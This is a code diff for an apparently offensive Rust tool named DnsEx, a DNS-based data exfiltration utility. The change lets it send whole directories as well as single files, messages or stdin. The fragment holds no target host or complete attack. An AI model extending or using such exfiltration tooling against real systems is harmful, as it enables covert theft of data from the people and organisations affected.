@@ -10,6 +10,7 @@ mod client;
 mod error;
 mod handler;
 mod server;
+mod utils;
 
 #[derive(Parser, Debug)]
 #[command(author, version, about = "DnsEx - Created by coigner <coigner@tuta.com>", long_about = None)]
@@ -78,12 +79,20 @@ async fn main() -> Result<(), DnsexError> {
                 ExfilPayload {
                     filename: "message.txt".into(),
                     data: msg.into_bytes(),
+                    is_directory: false,
                 }
             } else if let Some(path) = file {
                 let path = Path::new(&path);
+                let (data, is_directory) = if path.is_dir() {
+                    (utils::encode_dir(path).await?, true)
+                } else {
+                    (fs::read(&path).await?, false)
+                };
+
                 ExfilPayload {
                     filename: path.into(),
-                    data: fs::read(&path).await?,
+                    data,
+                    is_directory,
                 }
             } else {
                 let mut buf = Vec::new();
@@ -93,6 +102,7 @@ async fn main() -> Result<(), DnsexError> {
                 ExfilPayload {
                     filename: "stdin.bin".into(),
                     data: buf,
+                    is_directory: false,
                 }
             };
 
